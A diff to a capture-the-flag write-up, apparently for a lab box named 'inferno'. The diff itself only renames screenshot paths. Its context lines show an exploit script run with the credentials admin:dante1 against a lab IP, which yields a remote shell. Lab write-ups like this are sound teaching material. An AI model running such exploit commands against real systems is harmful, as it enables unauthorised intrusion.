@@ -31,7 +31,7 @@ We have an authentication page
 
 Logged in&#x20;
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Initial Access
 
@@ -47,7 +47,7 @@ python2.7 exploit.py http://admin:dante1@10.10.103.251/inferno/ admin dante1 10.
 
 And got shell
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a .Download.dat file in the /home/dante dir, contains some cipher text.
 
